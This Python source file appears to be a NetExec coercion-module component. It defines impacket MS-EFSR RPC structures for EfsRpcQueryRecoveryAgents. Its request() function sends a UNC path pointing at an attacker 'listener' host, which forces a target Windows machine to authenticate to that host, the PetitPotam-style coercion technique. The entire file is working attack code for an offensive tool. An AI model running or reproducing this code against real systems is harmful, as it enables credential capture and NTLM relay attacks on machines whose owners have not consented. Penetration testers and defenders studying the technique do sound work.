from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR

from nxc.modules.coerce_plus_method.DCERPCSessionError import DCERPCSessionError


class EfsRpcQueryRecoveryAgents(NDRCALL):
    """Structure to make the RPC call to EfsRpcQueryRecoveryAgents() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    opnum = 7
    structure = (
        ("FileName", WSTR),  # Type: wchar_t *
    )


class EfsRpcQueryRecoveryAgentsResponse(NDRCALL):
    """Structure to parse the response of the RPC call to EfsRpcQueryRecoveryAgents() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    structure = ()


def request(dce, target, listener):
    request = EfsRpcQueryRecoveryAgents()
    request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
    dce.request(request)